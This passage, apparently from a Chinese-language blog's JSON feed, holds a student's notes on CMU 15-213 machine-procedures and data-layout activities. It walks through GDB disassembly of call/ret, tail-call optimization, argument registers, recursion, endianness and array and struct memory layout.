main:\n   0x000000000040114a &lt;+0&gt;:     push   %rbx\n   0x000000000040114b &lt;+1&gt;:     mov    (%rsi),%rsi\n   0x000000000040114e &lt;+4&gt;:     mov    $0x402010,%edi\n   0x0000000000401153 &lt;+9&gt;:     mov    $0x0,%eax\n   0x0000000000401158 &lt;+14&gt;:    callq  0x401040 &lt;printf@plt&gt;\n   0x000000000040115d &lt;+19&gt;:    int3\n   0x000000000040115e &lt;+20&gt;:    mov    $0x0,%ebx\n   0x0000000000401163 &lt;+25&gt;:    jmp    0x40117d &lt;main+51&gt;\n   0x0000000000401165 &lt;+27&gt;:    movslq %ebx,%rax\n   0x0000000000401168 &lt;+30&gt;:    mov    0x402e60(,%rax,8),%rdi\n   0x0000000000401170 &lt;+38&gt;:    callq  0x401030 &lt;puts@plt&gt;\n   0x0000000000401175 &lt;+43&gt;:    callq  0x4011db &lt;showStack&gt;\n   0x000000000040117a &lt;+48&gt;:    add    $0x1,%ebx\n   0x000000000040117d &lt;+51&gt;:    cmp    $0x2,%ebx\n   0x0000000000401180 &lt;+54&gt;:    jle    0x401165 &lt;main+27&gt;\n--Type &lt;RET&gt; for more, q to quit, c to continue without paging--\n   0x0000000000401182 &lt;+56&gt;:    mov    $0x402108,%edi\n   0x0000000000401187 &lt;+61&gt;:    callq  0x401030 &lt;puts@plt&gt;\n   0x000000000040118c &lt;+66&gt;:    int3\n   0x000000000040118d &lt;+67&gt;:    mov    $0x402270,%edi\n   0x0000000000401192 &lt;+72&gt;:    callq  0x401030 &lt;puts@plt&gt;\n   0x0000000000401197 &lt;+77&gt;:    int3\n   0x0000000000401198 &lt;+78&gt;:    mov    $0x402478,%edi\n   0x000000000040119d &lt;+83&gt;:    callq  0x401030 &lt;puts@plt&gt;\n   0x00000000004011a2 &lt;+88&gt;:    mov    $0x0,%eax\n   0x00000000004011a7 &lt;+93&gt;:    pop    %rbx\n   0x00000000004011a8 &lt;+94&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>可以看到这个值是<code>callq  0x4011db &lt;showStack&gt;</code>的下一条指令地址，也就是<code>callq</code>调用的返回地址。</p>\n<p>输入<code>c</code>继续，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nshowStack has been called a third time. Now let&#39;s watch it return.\nGDB provides many commands for advancing through the program\nother than &#39;c&#39;ontinue. The &#39;si&#39; command, for instance,\nexecutes a single assembly instruction.\n\nUse this command twice now.\nAfter each step, print the values of %rsp and %rip:\n\n(gdb) si\n(gdb) p $rsp\n(gdb) p $rip\n\nBased on how %rsp and %rip changed after each instruction,\nanswer Problems 2 and 3 now. When you are finished, &#39;c&#39;ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>输入<code>si</code>，<code>%rsp</code>和<code>%rip</code>的值如下：</p>\n<pre><code>(gdb) p $rsp\n$1 = (void *) 0x7fffffffdde8\n(gdb) p $rip\n$2 = (void (*)()) 0x4011e2 &lt;showStack+7&gt;\n</code></pre>\n<p>对<code>showStack</code>函数进行反汇编可以看到：</p>\n<pre><code>(gdb) disassemble showStack\nDump of assembler code for function showStack:\n   0x00000000004011db &lt;+0&gt;:     pushq  $0x15213\n   0x00000000004011e0 &lt;+5&gt;:     int3\n   0x00000000004011e1 &lt;+6&gt;:     pop    %rax\n=&gt; 0x00000000004011e2 &lt;+7&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>这里<code>%rip</code>指向的是<code>retq</code>指令，再次打印<code>%rsp</code>和<code>%rip</code>的值可以看到：</p>\n<pre><code>(gdb) p $rsp\n$3 = (void *) 0x7fffffffddf0\n(gdb) p $rip\n$4 = (void (*)()) 0x40117a &lt;main+48&gt;\n</code></pre>\n<p>这里<code>%rsp</code>的值相对于<code>retq</code>前+8，并且<code>$rip</code>的值等于下一条指令的地址。由此可以推断，此处<code>ret</code>指令将栈顶的地址弹出，并赋值给<code>%rip</code>。那么<code>callq</code>指令做的事就是将下一条指令的地址压栈，然后将<code>%rip</code>的值设置为<code>callq</code>的目标地址。</p>\n<p>输入<code>c</code>继续，指令如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nAs you&#39;ve seen, a ret pops a 64-bit address off the\ntop of the stack and jumps to that location.\n\nNow disassemble the function returnOne. It calls another function, abs.\nBased on what you see, and your knowledge of the ret instruction,\nanswer Problem 4 now. When you are finished, &#39;c&#39;ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/calls.c:156\n156     in machine-procedures/calls.c\n</code></pre>\n<p>对<code>returnOne</code>进行反汇编可以看到：</p>\n<pre><code>(gdb) disassemble returnOne\nDump of assembler code for function returnOne:\n   0x00000000004011e7 &lt;+0&gt;:     mov    $0xffffffff,%edi\n   0x00000000004011ec &lt;+5&gt;:     callq  0x401142 &lt;abs&gt;\n   0x00000000004011f1 &lt;+10&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>对<code>returnOneOpt</code>进行反汇编即可看到：</p>\n<pre><code>(gdb) disassemble returnOneOpt\nDump of assembler code for function returnOneOpt:\n   0x00000000004011f2 &lt;+0&gt;:     mov    $0xffffffff,%edi\n   0x00000000004011f7 &lt;+5&gt;:     jmpq   0x401142 &lt;abs&gt;\nEnd of assembler dump.\n</code></pre>\n<p>对<code>abs</code>反汇编结果如下：</p>\n<pre><code>(gdb) disassemble abs\nDump of assembler code for function abs:\n   0x0000000000401142 &lt;+0&gt;:     mov    %edi,%eax\n   0x0000000000401144 &lt;+2&gt;:     cltd\n   0x0000000000401145 &lt;+3&gt;:     xor    %edx,%eax\n   0x0000000000401147 &lt;+5&gt;:     sub    %edx,%eax\n   0x0000000000401149 &lt;+7&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p><code>returnOne</code>中的过程是，先<code>callq  0x401142 &lt;abs&gt;</code>，然后<code>retq</code>。<code>returnOneOpt</code>改为直接<code>jmpq   0x401142 &lt;abs&gt;</code>。而<code>abs</code>执行完后直接<code>retq</code>。</p>\n<p>对<code>returnOne</code>，其过程为：</p>\n<ol>\n<li>将 main 函数中下一条指令地址压栈，将<code>returnOne</code>地址赋给<code>%rip</code></li>\n<li>执行一段，调用<code>abs</code></li>\n<li>将<code>returnOne</code>中下一条指令地址压栈，把<code>abs</code>地址付给<code>%rip</code></li>\n<li>执行一段，从<code>abs</code>返回（执行<code>abs</code>的<code>retq</code>），从栈中弹出<code>returnOne</code>中<code>retq</code>地址赋给<code>$rip</code>，<code>$rip</code>跳转到<code>returnOne</code>的<code>retq</code>。</li>\n<li>执行<code>returnOne</code>的<code>retq</code>，将栈顶返回地址弹出，赋给<code>$rip</code>。</li>\n</ol>\n<p>对<code>returnOneOpt</code>，其过程为：</p>\n<ol>\n<li>将 main 函数中下一条指令地址压栈，将<code>returnOne</code>地址赋给<code>%rip</code></li>\n<li>执行一段，跳转到<code>abs</code></li>\n<li>将<code>returnOne</code>中下一条指令地址压栈，把<code>abs</code>地址付给<code>%rip</code></li>\n<li>执行一段，从<code>abs</code>返回（执行<code>abs</code>的<code>retq</code>），从栈中弹出<code>main</code>中<code>retq</code>地址赋给<code>$rip</code></li>\n</ol>\n<p>可以这样进行优化的原因是两条<code>retq</code>指令连在一起，所以没有必要<code>retq</code>两次，将<code>abs</code>和<code>returnOne</code>的过程接在一起构成一个<code>procedure</code>，<code>retq</code>一次即可。</p>\n<p>输入<code>c</code>，题目中给出了答案：</p>\n<pre><code>(gdb) c\nContinuing.\n\nThe transformation you just witnessed is a simple example of tail-call\noptimization. Because a call was the last instruction before a ret,\nwithin a function that doesn&#39;t adjust the stack pointer, the compiler\ncould skip allocating a stack frame: both the call and the ret could be\nreplaced with a simple jmp to the called function. That function must\nend in its own ret instruction, which will use the return address\npushed by the call to returnOneOpt. This optimization is especially\nvaluable when applied to recursive functions.\n\nEnd of Activity 1. This program will now exit.\n\nUse the &#39;q&#39;uit command to leave GDB.\n\n[Inferior 1 (process 68527) exited normally]\n</code></pre>\n<p>原来这里是尾递归优化的精髓啊！明白啦！</p>\n<h2 id=\"Activity-2\"><a href=\"#Activity-2\" class=\"headerlink\" title=\"Activity 2\"></a>Activity 2</h2><p>输入<code>gdb --args ./locals</code>，输入<code>r</code>，再输入<code>c</code>，得到的提示如下：</p>\n<pre><code>The stack is also used to pass data between procedures, but nowadays\nmost function arguments are passed in registers instead.  You have\nalready seen the first two argument-passing registers (%rdi and %rsi,\nin that order) in use.\n\nDissassemble the function seeArgs.\nIt calls printf with six arguments.  Arguments 2-6 are labeled for you\nin the assembly.\nBased on what you see in the disasssembly, answer Problem 6.\nCheck your answer using:\n(gdb) x/s &lt;value passed in %rdi&gt;.\n\nWhen you are finished, &#39;c&#39;ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/locals.c:156\n156     in machine-procedures/locals.c\n</code></pre>\n<p>输入<code>disassemble seeArgs</code>，提示如下：</p>\n<pre><code>(gdb) disassemble seeArgs\nDump of assembler code for function seeArgs:\n   0x0000000000401152 &lt;+0&gt;:     sub    $0x8,%rsp\n   0x0000000000401156 &lt;+4&gt;:     mov    $0x6,%r9d\n   0x000000000040115c &lt;+10&gt;:    mov    $0x5,%r8d\n   0x0000000000401162 &lt;+16&gt;:    mov    $0x4,%ecx\n   0x0000000000401167 &lt;+21&gt;:    mov    $0x3,%edx\n   0x000000000040116c &lt;+26&gt;:    mov    $0x2,%esi\n   0x0000000000401171 &lt;+31&gt;:    mov    $0x402016,%edi\n   0x0000000000401176 &lt;+36&gt;:    mov    $0x0,%eax\n   0x000000000040117b &lt;+41&gt;:    callq  0x401050 &lt;printf@plt&gt;\n   0x0000000000401180 &lt;+46&gt;:    add    $0x8,%rsp\n   0x0000000000401184 &lt;+50&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>第一个传入的参数保存在<code>%edi</code>中，其值是<code>0x402016</code>。估摸着是<code>int</code>类型。输入<code>x/s 0x402016</code>，显示：</p>\n<pre><code>(gdb) x/s 0x402016\n0x402016:       &quot;%d %d %d %d %d&quot;\n</code></pre>\n<p>确实是<code>int</code>类型，那么此处猜测<code>x/s</code>是打印从该处开始的字符串。</p>\n<p>输入<code>c</code>，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nNow disassemble the function seeMoreArgs.\nIt calls printf with eight arguments.\nBased on what you see in the disasssembly, answer Problem 7.\nWhen you are finished, &#39;c&#39;ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/locals.c:156\n</code></pre>\n<p>输入<code>disassemble seeMoreArgs</code>，输出如下：</p>\n<pre><code>(gdb) disassemble seeMoreArgs\nDump of assembler code for function seeMoreArgs:\n   0x0000000000401185 &lt;+0&gt;:     sub    $0x8,%rsp\n   0x0000000000401189 &lt;+4&gt;:     pushq  $0x8\n   0x000000000040118b &lt;+6&gt;:     pushq  $0x7\n   0x000000000040118d &lt;+8&gt;:     mov    $0x6,%r9d\n   0x0000000000401193 &lt;+14&gt;:    mov    $0x5,%r8d\n   0x0000000000401199 &lt;+20&gt;:    mov    $0x4,%ecx\n   0x000000000040119e &lt;+25&gt;:    mov    $0x3,%edx\n   0x00000000004011a3 &lt;+30&gt;:    mov    $0x2,%esi\n   0x00000000004011a8 &lt;+35&gt;:    mov    $0x402010,%edi\n   0x00000000004011ad &lt;+40&gt;:    mov    $0x0,%eax\n   0x00000000004011b2 &lt;+45&gt;:    callq  0x401050 &lt;printf@plt&gt;\n   0x00000000004011b7 &lt;+50&gt;:    add    $0x18,%rsp\n   0x00000000004011bb &lt;+54&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>第 7 个和第 8 个被压在栈上。寄存器只有 6 个，多的就压在栈上。</p>\n<p>输入<code>c</code>，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nThe stack can also be used to store local variables.\n\nNow disassemble the function getV.\nIt contains a local array of 4 ints.\n(The compiler has chosen to reserve some extra stack space.)\nBased on what you see in the disasssembly, answer Problems 7 and 8.\nWhen you are finished, &#39;c&#39;ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/locals.c:156\n</code></pre>\n<p>输入<code>disassemble getV</code>，结果如下：</p>\n<pre><code>(gdb) disassemble getV\nDump of assembler code for function getV:\n   0x00000000004011bc &lt;+0&gt;:     sub    $0x18,%rsp\n   0x00000000004011c0 &lt;+4&gt;:     movslq %edi,%rsi\n   0x00000000004011c3 &lt;+7&gt;:     mov    %rsp,%rdi\n   0x00000000004011c6 &lt;+10&gt;:    callq  0x401284 &lt;getValue&gt;\n   0x00000000004011cb &lt;+15&gt;:    add    $0x18,%rsp\n   0x00000000004011cf &lt;+19&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p><code>getV</code>的调用过程如下：</p>\n<ol>\n<li><code>%rsp - 24</code>，留出 24 个字节的位置</li>\n<li><code>%rsi = %edi, %rdi = %rsp</code><br>将<code>%rsp</code>的位置通过<code>%rdi</code>传入。<code>%rsp</code>指向数组的起始位置。</li>\n</ol>\n<p>对<code>getValue</code>进行反汇编结果如下：</p>\n<pre><code>(gdb) disassemble getValue\nDump of assembler code for function getValue:\n   0x0000000000401284 &lt;+0&gt;:     mov    (%rdi,%rsi,4),%eax\n   0x0000000000401287 &lt;+3&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>输入<code>c</code>继续，结果如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nThere are also rules for whether a function is allowed to change\nthe value in each register--all the registers, not just those\nused for arguments.\n\nEach register is either call-preserved or call-clobbered.\nWhen a function returns, all the call-preserved registers must\nhave the same values that they did when the function was called.\nThat means, if a function wants to use a call-preserved register,\nit must save the old value first, and restore it when it&#39;s done using\nthe register. (The push and pop instructions are often used for this.)\n\n(More text to follow, &#39;c&#39;ontinue to go on...)\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/locals.c:156\n</code></pre>\n<p>继续输入<code>c</code>，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\n... The call-clobbered registers, on the other hand, don&#39;t have to be\nsaved and restored. A function that wants to use them can just use\nthem, without worrying about whether its callers were using them also.\nHowever, if a function has an important value in a call-clobbered\nregister, and it needs to call some other function, and then use that\nimportant value afterward, it has to save the value itself!\n\n(Some people use the term &#39;callee-save&#39; instead of &#39;call-preserved&#39;,\nand &#39;caller-save&#39; instead of &#39;call-clobbered&#39;. We don&#39;t like those\nterms because there&#39;s only one letter of difference between them.)\n\nDisassemble the function mult4 and think about how it is using the registers.\nUsing what you find, answer Problem 9. When you are finished, &#39;c&#39;ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/locals.c:156\n156     in machine-procedures/locals.c\n</code></pre>\n<p>本段提示主要讲了<code>caller saved registers</code>的概念。</p>\n<p><code>caller saved registers</code>(我个人觉得更准确的说法是<code>caller preserver &amp; restore</code>)，例如下列的过程调用（写的比较粗糙）：</p>\n<pre><code class=\"asm\">call_echo:\n    pushq %rbx\n    callq echo&lt;xxxx&gt;\n    popq %rbx\n    ret\n\necho:\n    %rbx += 1\n    call printf&lt;xxxx&gt;\n    ret\n</code></pre>\n<p>在<code>echo</code>的过程中会修改<code>%rbx</code>的值，那么在对其进行调用前就必须<code>pushq %rbx</code>，并且在调用完后<code>popq %rbx</code>。</p>\n<p>输入<code>disassemble mult4</code>可得如下结果：</p>\n<pre><code>(gdb) disassemble mult4\nDump of assembler code for function mult4:\n   0x0000000000401250 &lt;+0&gt;:     push   %rbx\n   0x0000000000401251 &lt;+1&gt;:     push   %r12\n   0x0000000000401253 &lt;+3&gt;:     push   %r13\n   0x0000000000401255 &lt;+5&gt;:     mov    %edx,%r12d\n   0x0000000000401258 &lt;+8&gt;:     mov    %ecx,%r13d\n   0x000000000040125b &lt;+11&gt;:    callq  0x40124a &lt;mult2&gt;\n   0x0000000000401260 &lt;+16&gt;:    mov    %r12d,%edi\n   0x0000000000401263 &lt;+19&gt;:    mov    %r13d,%esi\n   0x0000000000401266 &lt;+22&gt;:    mov    %eax,%ebx\n   0x0000000000401268 &lt;+24&gt;:    callq  0x40124a &lt;mult2&gt;\n   0x000000000040126d &lt;+29&gt;:    mov    %eax,%edi\n   0x000000000040126f &lt;+31&gt;:    mov    %ebx,%esi\n   0x0000000000401271 &lt;+33&gt;:    callq  0x40124a &lt;mult2&gt;\n   0x0000000000401276 &lt;+38&gt;:    pop    %r13\n   0x0000000000401278 &lt;+40&gt;:    pop    %r12\n   0x000000000040127a &lt;+42&gt;:    pop    %rbx\n   0x000000000040127b &lt;+43&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>然后<code>disassemble mult2</code>，结果如下：</p>\n<pre><code>(gdb) disassemble mult2\nDump of assembler code for function mult2:\n   0x000000000040124a &lt;+0&gt;:     mov    %edi,%eax\n   0x000000000040124c &lt;+2&gt;:     imul   %esi,%eax\n   0x000000000040124f &lt;+5&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>可以看到<code>mult2</code>函数中主要使用到的是<code>%edi</code>和<code>%esi</code>两个寄存器。返回值在<code>%eax</code>中。在<code>mult4</code>中，压入了<code>%rbx %r12 %r13</code>。</p>\n<p>输入<code>c</code>，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nFor the final step in today&#39;s activity, we will look at recursive\ncalls. Each recursive invocation of a function has its own space on\nthe stack, separate from any other call&#39;s space.\n\nDisassemble the function mrec and think about what it does.\nAnswer Problem 10. When you are finished, &#39;c&#39;ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/locals.c:156\n</code></pre>\n<p>输入<code>disassemble mrec</code>，得到如下结果：</p>\n<pre><code>(gdb) disassemble mrec\nDump of assembler code for function mrec:\n   0x00000000004011d0 &lt;+0&gt;:     push   %rbx\n   0x00000000004011d1 &lt;+1&gt;:     mov    %edi,%ebx\n   0x00000000004011d3 &lt;+3&gt;:     cmp    $0x1,%edi\n   0x00000000004011d6 &lt;+6&gt;:     je     0x4011e5 &lt;mrec+21&gt;\n   0x00000000004011d8 &lt;+8&gt;:     lea    -0x1(%rdi),%edi\n   0x00000000004011db &lt;+11&gt;:    callq  0x4011d0 &lt;mrec&gt;\n   0x00000000004011e0 &lt;+16&gt;:    imul   %ebx,%eax\n   0x00000000004011e3 &lt;+19&gt;:    pop    %rbx\n   0x00000000004011e4 &lt;+20&gt;:    retq\n   0x00000000004011e5 &lt;+21&gt;:    mov    %edi,%eax\n   0x00000000004011e7 &lt;+23&gt;:    jmp    0x4011e3 &lt;mrec+19&gt;\nEnd of assembler dump.\n</code></pre>\n<p>将该函数转化为 C 函数，如下：</p>\n<pre><code class=\"c\">// arg in %rbx\nint mrec(int* rbx)\n&#123;\n    // int* temp = rbx; // 保存%rbx\n    ebx = edi; // rbx 重新赋值\n    if(edi == 0x1) &#123;\n        eax = edi; // 返回值 = edi\n        // rbx = temp; // 获得rbx原值\n        return eax;\n    &#125;\n    edi = rdi - 0x1; // edi -= 1\n    int eax = mrec(rbx); // 获得返回值\n    eax *= ebx; // 返回值 * ebx\n    // rbx = temp; // 获得rbx原值\n    return eax;\n&#125;\n\n// 一个更加C的版本\nint mrec(int x)\n&#123;\n    if(x == 0x1) &#123;\n        return x;\n    &#125;\n    return x * mrec(x-1);\n&#125;\n</code></pre>\n<p>推测该函数实现了<code>x</code>的阶乘？</p>\n<h2 id=\"Activity-3\"><a href=\"#Activity-3\" class=\"headerlink\" title=\"Activity 3\"></a>Activity 3</h2><p>重新运行<code>gdb -args ./calls</code>，运行到<code>showStack</code>处，打印<code>$rip</code>前 3 个字节，得到如下结果：</p>\n<pre><code>(gdb) x/3b $rsp\n0x7fffffffdde0: 0x13    0x52    0x01\n</code></pre>\n<p>可以看到数字<code>0x15213</code>的高位存放在高字节中，低位存放在低字节中，该机器使用的是小端法。</p>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20data%20activity/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20data%20activity/",
            "title": "15-213 Machine Data Activity 记录",
            "date_published": "2024-02-29T09:15:08.000Z",
            "content_html": "<p>输入 <code>gdb ./data-layout</code> ，开启 <code>Data activity</code>  之旅。</p>\n<h2 id=\"integers-and-local-variables\"><a class=\"markdownIt-Anchor\" href=\"#integers-and-local-variables\">#</a> Integers and Local Variables</h2>\n<p><code>returnOne</code>  的 C 语言版本如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">returnOne</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> local <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">abs</span><span class=\"token punctuation\">(</span>local<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>输入 <code>disassemble returnOne</code> ，得到如下结果：</p>\n<pre><code>(gdb) disassemble returnOne\nDump of assembler code for function returnOne:\n   0x0000000000400581 &lt;+0&gt;:     sub    $0x8,%rsp\n   0x0000000000400585 &lt;+4&gt;:     mov    $0xffffffff,%edi\n   0x000000000040058a &lt;+9&gt;:     callq  0x400613 &lt;abs&gt;\n   0x000000000040058f &lt;+14&gt;:    add    $0x8,%rsp\n   0x0000000000400593 &lt;+18&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>可以看到首先我们为 <code>returnOne</code>  预留了 8 个字节的栈空间。将 <code>0xffffffff</code>  放入 <code>%edi</code> （应该是传入函数的第一个参数寄存器）。然后调用 <code>abs</code> ，最后还原栈空间。</p>\n<p>对 <code>abs</code>  进行反汇编结果如下：</p>\n<pre><code>(gdb) disassemble abs\nDump of assembler code for function abs:\n   0x0000000000400613 &lt;+0&gt;:     mov    %edi,%edx\n   0x0000000000400615 &lt;+2&gt;:     sar    $0x1f,%edx\n   0x0000000000400618 &lt;+5&gt;:     mov    %edi,%eax\n   0x000000000040061a &lt;+7&gt;:     xor    %edx,%eax\n   0x000000000040061c &lt;+9&gt;:     sub    %edx,%eax\n   0x000000000040061e &lt;+11&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p><code>abs</code>  所做的是把 <code>%edi</code>  放入 <code>%edx</code> ，然后将其右移 31 位（也就是让符号位充满），将其和原值相异或，然后再减去全符号位。最后返回 <code>%eax</code> 。此处 <code>local</code>  变量应该是存储在寄存器 <code>%edi</code>  中。这里的问题是如果 <code>local</code>  不在栈上，那么我们就没有办法获取它的地址。如果需要 <code>local</code>  的地址的话，我们可能需要将其压在栈上，然后使用 <code>leaq %rsp, %rdi</code>  获取它的地址。</p>\n<p>为了验证我们的结论，我们对 <code>returnOneTwo</code>  进行反汇编：</p>\n<pre><code>(gdb) disassemble returnOneTwo\nDump of assembler code for function returnOneTwo:\n   0x0000000000400594 &lt;+0&gt;:     sub    $0x18,%rsp\n   0x0000000000400598 &lt;+4&gt;:     movl   $0xffffffff,0xc(%rsp)\n   0x00000000004005a0 &lt;+12&gt;:    lea    0xc(%rsp),%rdi\n   0x00000000004005a5 &lt;+17&gt;:    callq  0x40061f &lt;absp&gt;\n   0x00000000004005aa &lt;+22&gt;:    add    $0x18,%rsp\n   0x00000000004005ae &lt;+26&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>该函数所做的是预留 24 个字节的空间，然后把 <code>0xffffffff</code>  放入 <code>M[%rsp + 12]</code>  的位置上，并且将指向该位置的指针赋给 <code>%rdi</code> ，随后调用 <code>absp</code> 。由此推测， <code>absp</code>  的传入参数是一个指针（ <code>%rdi</code>  中）。调用完成后恢复栈空间。</p>\n<p>因此， <code>absp</code>  的函数原型应该是 <code>int absp(int* p)</code> 。</p>\n<h2 id=\"arrays\"><a class=\"markdownIt-Anchor\" href=\"#arrays\">#</a> Arrays</h2>\n<p><code>x</code>  的几种不同格式的显示<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81ODkzMDhkZDM2ZGM=\">见此</span>。这里的显示需要指明 3 个内容：</p>\n<ol>\n<li>显示几个单位</li>\n<li>每个单位几个字节：如 b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes（如果不指定，默认 1 字节）</li>\n<li>用几进制显示： <code>b</code>  就是 2 进制， <code>x</code>  就是 16 进制， <code>d</code>  就是 10 进制</li>\n</ol>\n<p>使用 <code>x/4b courses</code>  只能查看 4 个字节，以 10 进制数显示，结果如下：</p>\n<pre><code>(gdb) x/4b courses\n0x601110 &lt;courses&gt;:     19      82      1       0\n</code></pre>\n<p>使用 <code>x/4x courses</code>  只能查看 4 个字节，以 16 进制数显示，结果如下：</p>\n<pre><code>(gdb) x/4x courses\n0x601110 &lt;courses&gt;:     0x13    0x52    0x01    0x00\n</code></pre>\n<p>使用 <code>x/4wx courses</code>  查看 <code>courses</code>  处的 4 个 <code>int</code>  类型值。 <code>w</code>  是 4 个字节。结果如下：</p>\n<pre><code>(gdb) x/4wx courses\n0x601110 &lt;courses&gt;:     0x00015213      0x00015513      0x00018213      0x00018600\n</code></pre>\n<p>可以看到 <code>courses</code>  处存放了 4 个值：15213 15513 18213 18600，对应数组中的 4 个元素。</p>\n<p><code>getNth</code>  函数的 C 语言形式如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">getNth</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>arr <span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> index<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> arr<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>其中 <code>%rdi</code>  是数组的起始位置 ( <code>arr</code> )， <code>%rsi</code>  是索引 ( <code>index</code> )。因为一个 <code>int</code>  类型是 4 个字节，因此计算地址的时候是 <code>*(rdi + 4 * rsi)</code></p>\n<p>对 <code>getNth</code>  函数进行反汇编可得：</p>\n<pre><code>(gdb) disassemble getNth\nDump of assembler code for function getNth:\n   0x00000000004005af &lt;+0&gt;:     mov    (%rdi,%rsi,4),%eax\n   0x00000000004005b2 &lt;+3&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>重新运行，输入一次 <code>c</code> ，输入 <code>x/bx $rdi</code>  可得：</p>\n<pre><code>(gdb) x/s $rdi\n0x4007f8:       &quot;15213 CSAPP&quot;\n</code></pre>\n<p>此处的字符串是 <code>15213 CSAPP</code> 。（推测 <code>x/s $rdi</code>  的意思以字符串的形式打印从 <code>$rdi</code>  开始的内存）。输入 <code>x/12bx $rdi</code> ，可以得到如下结果：</p>\n<pre><code>(gdb) x/12bx $rdi\n0x4007f8:       0x31    0x35    0x32    0x31    0x33    0x20    0x43    0x53\n0x400800:       0x41    0x50    0x50    0x00\n</code></pre>\n<p>字符串的结尾是 <code>0x00</code> ， <code>x/s</code>  命令应该是通过 <code>0x00</code>  判断字符串的结尾，进而计算字符串的长度的。</p>\n<h2 id=\"structs\"><a class=\"markdownIt-Anchor\" href=\"#structs\">#</a> Structs</h2>\n<p>定义 <code>struct course</code>  如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">course</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> cs_ugrad<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> cs_grad<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> ece_ugrad <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">int</span> ece_grad<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token 